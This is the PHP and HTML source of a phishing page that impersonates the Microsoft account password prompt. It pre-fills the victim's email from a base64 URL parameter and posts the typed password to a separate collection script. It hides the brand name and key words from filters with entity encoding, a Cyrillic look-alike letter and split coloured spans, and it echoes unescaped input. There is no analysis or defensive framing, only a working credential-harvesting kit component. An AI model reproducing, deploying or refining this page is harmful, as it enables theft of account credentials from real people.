﻿<?php
error_reporting(0);

$data = $_GET['kamu'];
if ( base64_encode(base64_decode($data)) === $data){
    $email = base64_decode($data);
} else {
    $email = $data;
}

?>

<!doctype html>
<html dir="ltr" lang="EN-US">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>M&#105;cro&#115;&#111;&#102;&#116; ac&#99;&#111;&#117;nt</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<link rel="shortcut icon" href="">
	<link rel="stylesheet" title="Converged" type="text/css" href="css/style2.css">
	<style type="text/css">body{display:none;}</style>
	<style type="text/css">body{display:block !important;}</style>
	<style type="text/css">body{display:block !important;}</style>
</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
	<div>
		<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
			<!-- <div style="background-image: url(&quot;images/t43effd.jpg&quot;);"></div> -->
			<div class="backgroundImage" style="background-image: url(&quot;images/&quot;);"></div>
		</div>
	</div> 
			<form  novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="sent11.php">
			<div class="outer">
				<div class="middle">
					<div class="inner">
						<div>
							<img class="logo" src="images/httpp2.png">
						</div>
					
						<div role="main" >
							<div class="">
								<div class="animate slide-in-next"> 
									<div class="identityBanner">
										<!-- <button type="button" class="backButton" id="idBtn_Back" aria-label="Back">
										<img role="presentation" src="images/"></button> -->
										<div id="displayName" class="identity" title=""><?php echo $email; ?></div>
									</div>
								</div>
							</div>
								<div class="pagination-view animate has-identity-banner slide-in-next" >
									<input name="kamu" value="<?php echo $email; ?>" type="hidden"> 
									<input name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"> 
									<div id="loginHeader" class="row text-title" role="heading" aria-level="1" >E<span style="color: rgb(40, 50, 78);">nte</span>r pas<span style="color: rgb(40, 50, 78);">swo</span>rd</div>
										<div class="row"> 
											<div class="form-group col-md-24"> 
												<div role="alert" aria-live="assertive" aria-atomic="false"></div>
												<div class="placeholderContainer" >
													<input name="rahasia1" id="i0118" required="" autocomplete="off" autofocus="" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="P&#1072;ssword" aria-label="<?php echo $email; ?>" type="password">
												</div> 
											</div> 
										</div>
									<div class="position-buttons">
										<div>
											<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top"> 
												<label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" aria-label="Keep me signed in" type="checkbox"> 
												<span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Ke<span style="color: rgb(40, 50, 78);">ep me sign</span>ed in</span></label> 
											</div>
											<div class="row"> 
												<div class="col-md-24"> 
													<div class="text-13 action-links"> 
														<div class="form-group">
														<a id="idA_PWD_ForgotPassword" role="link" href="#" >F<span style="color: rgb(40, 50, 78);">org</span>ot p<span style="color: rgb(40, 50, 78);">asswo</span>rd?</a></div>
													<div class="form-group"></div>
													</div> 
												</div> 
											</div> 
										</div>
										<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> 
										<div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" >
											<div class="inline-block">
												<input id="idSIButton9" class="btn btn-block btn-primary" value="Sign in" type="submit"> 
											</div> 
										</div>
									</div> 
								</div>
							</div>
						</div>
					</div> 
				</div> 
			</div> 
					<div id="footer" class="footer default new-background-image"> 
						<div>
							<div id="footerLinks" class="footerNode text-secondary">
								<a id="ftrTerms" href="#"></a> 
								<a id="ftrPrivacy" href="#"></a>
								<img class="mobileMode" role="presentation" src="images/5644rtyrtyrty6e65b4c">
							</div> 
						</div> 
					</div> 
		</form> 
		<form method="post" target="_top"></form>
</body>
</html>